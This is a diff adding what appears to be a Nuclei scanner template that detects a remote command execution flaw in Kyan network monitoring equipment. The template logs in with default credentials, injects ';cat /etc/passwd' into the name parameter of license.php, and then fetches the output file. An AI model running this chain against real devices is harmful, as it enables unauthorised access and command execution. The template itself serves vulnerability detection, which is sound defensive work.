@@ -1,0 +1,75 @@
+id: kyan-network-monitoring-equipment-license-php-rce
+
+info:
+  name: Kyan Network Monitoring Equipment license.php Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: '{{rand_int(1, 1000)}}'
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: login-request
+    method: POST
+    path:
+      - '{{BaseURL}}/login.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: user=admin&passwd=admin1234&x=49&y=24
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: regex
+        part: header
+        regex:
+          - 'PHPSESSID=(?P<cookie>[0-9a-z]+)'
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - 'PHPSESSID=([0-9a-z]+)'
+        group: 1
+
+  - id: command-injection-request
+    method: GET
+    path:
+      - '{{BaseURL}}/license.php?cmd=delete&name=;cat+/etc/passwd>{{t1}}.txt'
+    headers:
+      Cookie: PHPSESSID={{cookie}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '选择文件'
+          - '上传授权'
+
+  - id: verify-file-request
+    method: GET
+    path:
+      - '{{BaseURL}}/{{t1}}.txt'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - '/bin'
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
